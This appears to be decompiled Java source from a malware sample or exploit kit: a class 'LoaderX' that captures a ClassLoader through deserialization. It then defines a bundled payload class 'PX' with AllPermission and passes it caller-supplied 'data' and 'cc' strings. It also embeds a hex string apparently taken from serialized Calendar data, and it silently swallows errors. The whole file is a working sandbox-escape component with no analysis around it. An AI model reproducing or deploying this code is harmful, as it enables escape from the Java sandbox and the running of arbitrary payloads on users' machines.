// Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.kpdus.com/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   LoaderX.java

package myf.y;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.security.*;
import java.security.cert.Certificate;

public class LoaderX extends ClassLoader
    implements Serializable
{

    public LoaderX()
    {
    }

    private void writeObject(ObjectOutputStream objectoutputstream)
        throws IOException, ClassNotFoundException
    {
        objectoutputstream.defaultWriteObject();
    }

    private void readObject(ObjectInputStream objectinputstream)
        throws IOException, ClassNotFoundException
    {
        instance = this;
        objectinputstream.defaultReadObject();
    }

    public void bootstrapPayload(String s, String s1)
        throws IOException
    {
        Object obj = null;
        try
        {
            ByteArrayOutputStream bytearrayoutputstream = new ByteArrayOutputStream();
            byte abyte0[] = new byte[8192];
            InputStream inputstream = getClass().getResourceAsStream("/myf/y/PX.class");
            String s2 = "6E69656E744900166D696E696D616C446179734  96E46697273745765656B4900096E657874537461  6D7049001573657269616C56657273696F6E4F6E53  747265616D4A000474696D655B00066669656C64737400025B495B000569735365747400025B5A4C00047A6F6E657400144C6A6176612F7574696C2F54696D655A6";
            int i;
            while((i = inputstream.read(abyte0)) > 0) 
                bytearrayoutputstream.write(abyte0, 0, i);
            abyte0 = bytearrayoutputstream.toByteArray();
            URL url = new URL("file:///");
            Certificate acertificate[] = new Certificate[0];
            Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            ProtectionDomain protectiondomain = new ProtectionDomain(new CodeSource(url, acertificate), permissions);
            Class class1 = defineClass("myf.y.PX", abyte0, 0, abyte0.length, protectiondomain);
            if(class1 != null)
            {
                Field field = class1.getField("data");
                Field field1 = class1.getField("cc");
                Object obj1 = class1.newInstance();
                field.set(obj1, s);
                field1.set(obj1, s1);
                obj1 = class1.newInstance();
            }
        }
        catch(Exception exception) { }
    }

    private static final long serialVersionUID = 0x5e8b4c67ddc409d8L;
    public static LoaderX instance = null;

}
